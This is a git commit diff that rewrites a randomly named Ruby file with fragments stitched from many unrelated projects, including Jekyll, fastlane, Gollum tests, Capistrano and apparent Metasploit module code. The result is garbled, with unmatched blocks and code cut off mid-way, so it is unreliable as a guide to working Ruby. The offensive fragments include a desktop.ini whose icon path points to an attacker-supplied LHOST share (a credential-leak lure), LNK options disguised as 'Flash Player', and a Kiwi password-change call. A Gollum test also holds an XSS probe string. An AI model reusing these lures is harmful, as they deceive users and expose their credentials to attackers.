9671d901ed333ece68891f02bf19f56e52881b78
SUNsung <weatherius@gmail.com>
2019-08-28 03:08:19 +0300

    Rewrite [24ZfyGPlYt69Y24CUzEc8rQP2624I6TrBgufVg24FyX.rb] File in: 2019-08-28 03:08:19

--- ruby/24ZfyGPlYt69Y24CUzEc8rQP2624I6TrBgufVg24FyX.rb
+++ ruby/24ZfyGPlYt69Y24CUzEc8rQP2624I6TrBgufVg24FyX.rb
@@ -1,23 +1,219 @@
 
         
-                # This method is expected to return a class that is used for
-        # configuring the provisioner. This return value is expected to be
-        # a subclass of {Config}.
-        #
-        # @return [Config]
-        def self.config_class
-        end
+        # Let's roll!
+SUITE.each do |key, text|
+  Benchmark.ips do |x|
+    x.report('always thru liquid - #{key}') { always_liquid(text) }
+    x.report('conditional liquid - #{key}') { conditional_liquid(text) }
+    x.compare!
+  end
+end
+
     
-    namespace :gem do
-  def version
-    require 'spree/core/version'
-    Spree.version
+      Jekyll::External.require_if_present(Jekyll::External.blessed_gems) do |g, ver_constraint|
+    cmd = g.split('-').last
+    p.command(cmd.to_sym) do |c|
+      c.syntax cmd
+      c.action do
+        Jekyll.logger.abort_with 'You must install the '#{g}' gem' \
+          ' version #{ver_constraint} to use the 'jekyll #{cmd}' command.'
+      end
+    end
   end
     
-              def render_order(result)
-            if result.success?
-              render_serialized_payload { serialized_current_order }
-            else
-              render_error_payload(result.error)
-            end
-          end
+            def start(opts)
+          @thread = Thread.new do
+            # Use epoll if the kernel supports it
+            EM.epoll
+            EM.run do
+              EM.error_handler { |e| log_error(e) }
+    
+          [
+        FastlaneCore::ConfigItem.new(key: :username,
+                                     short_option: '-u',
+                                     env_name: 'DELIVER_USERNAME',
+                                     description: 'Your Apple ID Username',
+                                     default_value: user,
+                                     default_value_dynamic: true),
+        FastlaneCore::ConfigItem.new(key: :app_identifier,
+                                     short_option: '-a',
+                                     env_name: 'DELIVER_APP_IDENTIFIER',
+                                     description: 'The bundle identifier of your app',
+                                     optional: true,
+                                     code_gen_sensitive: true,
+                                     default_value: CredentialsManager::AppfileConfig.try_fetch_value(:app_identifier),
+                                     default_value_dynamic: true),
+        # version
+        FastlaneCore::ConfigItem.new(key: :app_version,
+                                     short_option: '-z',
+                                     description: 'The version that should be edited or created',
+                                     optional: true),
+    
+        describe 'Screenshots' do
+      it 'properly parses all the screenshots' do
+        v = app.live_version
+    
+            # Check each device to see if it is an iOS device
+        all_ios = devices.map do |device|
+          device = device.downcase
+          device.include?('iphone') || device.include?('ipad')
+        end
+        # Return true if all devices are iOS devices
+        return true unless all_ios.include?(false)
+    
+          def_node_matcher :find_output_method, <<-PATTERN
+        (defs (self) :output ...)
+      PATTERN
+    
+                @data_by_language[language] ||= {}
+            @data_by_language[language][output_name] ||= []
+    
+      def create_desktopini
+    ini=''
+    ini << '[.ShellClassInfo]\n'
+    ini << 'IconFile=\\\\#{datastore['LHOST']}\\icon.ico\n'
+    ini << 'IconIndex=1337'
+    
+    start = -1
+min = -1
+max = 0
+for segment in macho.segments
+  next if segment.segname == MachO::LoadCommands::SEGMENT_NAMES[:SEG_PAGEZERO]
+  puts 'segment: #{segment.segname} #{segment.vmaddr.to_s(16)}'
+  if min == -1 or min > segment.vmaddr
+    min = segment.vmaddr
+  end
+  if max < segment.vmaddr + segment.vmsize
+    max = segment.vmaddr + segment.vmsize
+  end
+end
+    
+          result = client.kiwi.password_change(opts)
+    
+        register_advanced_options(
+      [
+        OptString.new('LnkComment', [true, 'The comment to use in the generated LNK file', 'Manage Flash Player Settings']),
+        OptString.new('LnkDisplayName', [true, 'The display name to use in the generated LNK file', 'Flash Player'])
+      ]
+    )
+  end
+    
+        print_status('Complete')
+  end
+end
+
+    
+        print_good 'Finished!'
+  end
+end
+
+    
+          res
+    end
+    
+      def test_file_exists(path)
+    exists?('f', path)
+  end
+    
+    %i(git_strategy hg_strategy svn_strategy).each do |strategy|
+  validate(strategy) do |key, _value|
+    warn(
+      '[Deprecation Warning] #{key} is deprecated and will be removed in '\
+      'Capistrano 3.7.0.\n'\
+      'https://github.com/capistrano/capistrano/blob/master/UPGRADING-3.7.md'
+    )
+  end
+end
+    
+          context 'with no interpolation' do
+        let(:src) { URI::DEFAULT_PARSER.make_regexp.inspect }
+    
+      describe '#body' do
+    context 'with a single expression body' do
+      let(:source) do
+        'class << self; bar; end'
+      end
+    
+            it_behaves_like 'multiple capture'
+      end
+    
+    
+    {      # Checks whether the `hash` literal is delimited by curly braces.
+      #
+      # @return [Boolean] whether the `hash` literal is enclosed in braces
+      def braces?
+        loc.end&.is?('}')
+      end
+    end
+  end
+end
+
+    
+          def next_link
+        label = 'Next &raquo;'
+        if @versions.size == Gollum::Page.per_page
+          link = '/history/#{@page.name}?page=#{@page_num+1}'
+          %(<a href='#{link}' hotkey='l'>#{label}</a>)
+        else
+          %(<span class='disabled'>#{label}</span>)
+        end
+      end
+    end
+  end
+end
+
+    
+          def allow_editing
+        @allow_editing
+      end
+    
+        assert_match /Edit Page/,             last_response.body, ''Edit Page' link is blocked in compare template'
+    assert_match /Revert Changes/,        last_response.body, ''Revert Changes' link is blocked in compare template'
+  end
+    
+      test 'create sets the correct path for a relative path subdirectory with the page file directory set' do
+    Precious::App.set(:wiki_options, { :page_file_dir => 'foo' })
+    dir  = 'bardir'
+    name = '#{dir}/baz'
+    get '/create/foo/#{name}'
+    assert_match(/\/#{dir}/, last_response.body)
+    assert_no_match(/[^\/]#{dir}/, last_response.body)
+    # reset page_file_dir
+    Precious::App.set(:wiki_options, { :page_file_dir => nil })
+  end
+    
+      test 'h1 title can be disabled' do
+    title = 'H1'
+    @wiki.write_page(title, :markdown, '# 1 & 2 <script>alert('js')</script>' + '\n # 3', commit_details)
+    page = @wiki.page(title)
+    
+        # Remove all slashes from the start of string.
+    # Remove all double slashes
+    def clean_url url
+      return url if url.nil?
+      url.gsub('%2F', '/').gsub(/^\/+/, '').gsub('//', '/')
+    end
+    
+    # external
+require 'github/markup'
+require 'sanitize'
+    
+      end
+end
+
+    
+      before_action :login_required
+  before_action :verified_email_required
+  before_action :set_timezone
+    
+      def destroy
+    @domain.destroy
+    redirect_to_with_json [organization, @server, :domains]
+  end
+    
+      def destroy
+    @ip_pool.destroy
+    redirect_to_with_json :ip_pools, :notice => 'IP pool has been removed successfully.'
+  rescue ActiveRecord::DeleteRestrictionError => e
+    redirect_to_with_json [:edit, @ip_pool], :alert => 'IP pool cannot be removed because it is still assigned to servers/rules.'
+  end
